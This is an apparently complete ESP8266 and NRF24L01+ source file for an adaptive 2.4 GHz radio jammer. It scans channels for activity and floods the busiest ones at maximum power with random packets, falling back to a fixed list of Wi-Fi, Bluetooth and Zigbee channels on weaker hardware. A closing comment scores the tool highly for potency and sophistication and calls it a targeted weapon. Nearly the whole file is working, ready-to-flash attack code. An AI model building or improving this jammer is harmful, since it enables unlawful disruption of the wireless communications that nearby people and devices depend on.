// ESP8266 + NRF24L01+ Smart Adaptive RF Jammer with Scoring and Extended Priorities
// Description: Enhances RF jamming capabilities by incorporating:
// - A broader, protocol-aware list of priority channels (BLE, Wi-Fi, Zigbee)
// - Real-time signal scoring using testCarrier() to detect active channels
// - Smart scan phase to adaptively target channels with actual traffic
// - Fallback to static priority if scoring unsupported (older NRF24 clones)
// - Inline comments to explain logic clearly

// --- LIBRARIES ---
#include <ESP8266WiFi.h>      // Core library for ESP8266 Wi-Fi functions.
extern "C" {
  #include "user_interface.h" // Provides low-level Wi-Fi functions, not strictly needed here but good practice.
}
#include <SPI.h>              // Serial Peripheral Interface, for communication between ESP8266 and NRF24L01.
#include <nRF24L01.h>         // Defines registers and constants for the NRF24L01 chip.
#include <RF24.h>             // High-level library for controlling the NRF24L01 module.

// --- NRF24L01+ PIN CONFIGURATION ---
#define CE_PIN D2
#define CSN_PIN D1

// Initializes the RF24 radio object, specifying the Chip Enable (CE) and Chip Select Not (CSN) pins.
RF24 radio(CE_PIN, CSN_PIN);

// --- JAMMING PAYLOADS & ADDRESSES ---
const uint8_t baseAddr[5] = {'J', 'A', 'M', 'X', 'X'}; // A base address for transmissions.
uint8_t dynamicPayload[32];                   // A 32-byte buffer for the jamming data.

// --- TARGETING CONFIGURATION ---
// An array of channels known to be used by common 2.4GHz protocols. This is the fallback list.
const uint8_t extendedPriorityChannels[] = {
  // Channels for Wi-Fi, Bluetooth Low Energy (BLE), and Zigbee are included.
  2, 3, 4, 10, 12, 15, 17, 20, 22, 26, 30, 35, 37,
  40, 42, 47, 50, 55, 60, 62, 65, 70, 75, 80
};

// --- ADAPTIVE SCANNING VARIABLES ---
// Array to store the activity score for each of the 125 NRF24L01 channels.
uint16_t channelScores[125] = {0};
// Flag to check if the NRF24 module supports carrier detection, a feature of genuine chips.
bool testCarrierSupported = false;

// --- JAMMING PAYLOAD GENERATION ---
// Creates a pseudo-random payload to transmit. Using dynamic data is more effective for
// disrupting a wider range of receivers than a static pattern.
void constructDynamicPacket(uint8_t channel) {
  for (int i = 0; i < 32; i++) {
    // XORing timestamps and channel info creates a simple, chaotic pattern.
    uint8_t seed = (micros() >> (i % 3)) ^ (millis() & 0xFF);
    dynamicPayload[i] = (seed ^ (channel * (i + 1))) & 0xFF;
  }
}

// --- HARDWARE CAPABILITY CHECK ---
// Verifies if the connected NRF24L01 module can detect a carrier signal.
// Cheaper clones often lack this feature, so the code needs a fallback plan.
void checkNRF24Capabilities() {
  radio.setChannel(2); // Use a common channel for the test.
  radio.startListening();
  delayMicroseconds(300);
  testCarrierSupported = radio.testCarrier(); // This function returns false if the feature is not supported.
  radio.stopListening();
  Serial.printf("[INFO] testCarrier() support: %s\n", testCarrierSupported ? "YES" : "NO");
}

// --- "SMART" SCANNING FUNCTION ---
// Scans all 125 channels to build a "heatmap" of radio frequency activity.
void scanChannelActivity() {
  memset(channelScores, 0, sizeof(channelScores)); // Reset previous scores.
  for (uint8_t ch = 0; ch < 125; ch++) {
    radio.setChannel(ch);
    radio.startListening();
    delayMicroseconds(300); // Listen briefly for any signal.
    // testCarrier() checks for a persistent radio signal. If present, it means the channel is active.
    if (radio.testCarrier()) channelScores[ch]++;
    radio.stopListening();
  }
}

// --- "SMART" JAMMING FUNCTION ---
// This is the primary attack mode for genuine NRF24L01 modules.
// It identifies the most active channels and focuses all its power on them.
void jamTopActiveChannels() {
  // Simple sorting algorithm to find the 10 channels with the highest activity scores.
  uint8_t topChannels[10] = {0};
  for (uint8_t ch = 0; ch < 125; ch++) {
    for (uint8_t i = 0; i < 10; i++) {
      if (channelScores[ch] > channelScores[topChannels[i]]) {
        for (int j = 9; j > i; j--) topChannels[j] = topChannels[j - 1];
        topChannels[i] = ch;
        break;
      }
    }
  }

  // Attack each of the top 10 channels with a burst of random data.
  for (uint8_t i = 0; i < 10; i++) {
    uint8_t ch = topChannels[i];
    radio.setChannel(ch);
    for (int j = 0; j < 5; j++) {
      constructDynamicPacket(ch);
      // writeFast does not wait for an acknowledgement, which is ideal for flooding.
      radio.writeFast(dynamicPayload, 32);
      delayMicroseconds(150 + (micros() % 80)); // Short, slightly randomized delay.
    }
  }
}

// --- FALLBACK "DUMB" JAMMING FUNCTION ---
// This mode is used if the NRF24L01 clone doesn't support carrier detection.
// It blindly attacks a predefined list of important channels.
void jamStaticPriorityChannels() {
  for (uint8_t i = 0; i < sizeof(extendedPriorityChannels); i++) {
    uint8_t ch = extendedPriorityChannels[i];
    radio.setChannel(ch);

    // Continuously changing the transmission address can help bypass simple filters on some receivers.
    uint8_t addr[5];
    for (int j = 0; j < 5; j++) addr[j] = baseAddr[j] ^ ch ^ (micros() >> j);
    radio.openWritingPipe(addr);

    constructDynamicPacket(ch);
    for (uint8_t burst = 0; burst < 5; burst++) {
      radio.writeFast(dynamicPayload, 32);
      delayMicroseconds(120 + (micros() % 60));
    }
  }
}

// --- SETUP FUNCTION ---
// This function runs once on boot to initialize the hardware.
void setup() {
  Serial.begin(115200); // Initialize serial for debugging.

  // --- NRF24L01+ HARDWARE INITIALIZATION ---
  // Configure the NRF24L01 for high-power, unreliable, one-way transmission (ideal for jamming).
  radio.begin();
  radio.setAutoAck(false);            // Disable automatic acknowledgements.
  radio.setRetries(0, 0);             // Disable automatic retransmissions.
  radio.setCRCLength(RF24_CRC_DISABLED); // Disable CRC checking. The data is garbage anyway.
  radio.disableDynamicPayloads();     // Use fixed payload size.
  radio.setPayloadSize(32);           // Set a fixed 32-byte payload size.
  radio.setDataRate(RF24_2MBPS);      // Set the highest data rate for maximum interference.
  radio.setPALevel(RF24_PA_MAX);      // Set the highest power amplifier level for maximum range.
  radio.openWritingPipe(baseAddr);    // Set a default transmission address.
  radio.stopListening();              // Set the radio to transmit mode only.

  Serial.println("[INFO] Smart Adaptive NRF24 RF Jammer Initializing...");
  checkNRF24Capabilities(); // Check if we can use the "smart" mode.
}

// --- MAIN LOOP ---
// This function runs continuously, executing the attack logic.
void loop() {
  // Decide which attack mode to use based on the hardware check.
  if (testCarrierSupported) {
    scanChannelActivity();    // 1. Find active channels.
    jamTopActiveChannels();   // 2. Attack the most active channels.
  } else {
    jamStaticPriorityChannels(); // Fallback: Attack the predefined list of channels.
  }

  delay(100); // A brief pause before repeating the cycle.
}

// --- CYBERSECURITY ANALYSIS ---
/*
 * This section provides a detailed analysis of the code from a cybersecurity perspective.
 * The scores are based on a comparison to other similar open-source projects and general
 * security principles. The scale is 1-10, where 1 is poor/simple and 10 is excellent/highly advanced.
 */

/*
 * 1. Implementation & Completeness: 7/10
 * 
 * Explanation: This is a well-implemented and self-contained RF jammer. It is not a hybrid tool,
 * as it only performs a physical layer (Layer 1) attack, but it does so effectively.
 * - The code is robust, featuring a capability check (`checkNRF24Capabilities`) that allows it to
 *   degrade gracefully to a less "smart" mode if used with cheaper, less-functional hardware.
 * - It correctly configures the NRF24L01+ for maximum power and data rate to cause as much
 *   interference as possible.
 * - The logic is clean and separated into distinct functions for scanning and attacking.
 */

/*
 * 2. Effectiveness & Potency: 8/10
 * 
 * Explanation: As a pure physical layer jammer, this tool is highly effective.
 * - Protocol-Agnostic: Because it attacks the physical medium with raw radio noise, it is not
 *   limited to a specific protocol. It will disrupt Wi-Fi, Bluetooth, Zigbee, and any other
 *   device operating on the targeted 2.4GHz channels.
 * - Adaptive Targeting: The "smart" mode (`jamTopActiveChannels`) makes it significantly more
 *   potent than a simple jammer that just sweeps all channels. By concentrating its power on
 *   channels that are actually in use, it maximizes its impact and is more likely to successfully
 *   disrupt active communications.
 * - High Power: It correctly uses `RF24_PA_MAX` to transmit at the highest possible power,
 *   overpowering legitimate signals.
 */

/*
 * 3. Stealth & Evasion: 2/10
 * 
 * Explanation: This tool is designed to be "loud" and disruptive, not stealthy.
 * - Obvious RF Signature: The high-power, wideband noise generated by this device would be
 *   immediately and clearly visible on any spectrum analyzer. It makes no attempt to mimic
 *   legitimate traffic or hide its presence.
 * - Physically Locatable: Due to the strong and continuous nature of the signal, the physical
 *   device could be located with relative ease using directional antennas and spectrum analysis
 *   equipment (a process known as "fox hunting").
 */

/*
 * 4. Sophistication & Novelty: 7/10
 * 
 * Explanation: While RF jamming itself is a very old technique, this implementation shows a
 * higher level of sophistication than typical proof-of-concept projects.
 * - Adaptive Intelligence: The use of `testCarrier()` to actively find and target busy channels
 *   is the most sophisticated feature. It elevates the tool from a blunt instrument to a more
 *   targeted and efficient weapon.
 * - Hardware Awareness: The `checkNRF24Capabilities()` function shows a deeper understanding of
 *   the hardware ecosystem, acknowledging the prevalence of lower-quality clone chips and
 *   adapting the strategy accordingly. This makes the code more practical and reliable in the real world.
 * - Low-Cost Platform: Achieving this level of adaptive functionality on such an inexpensive and
 *   accessible hardware platform (ESP8266 + NRF24L01+) is a notable achievement.
 */
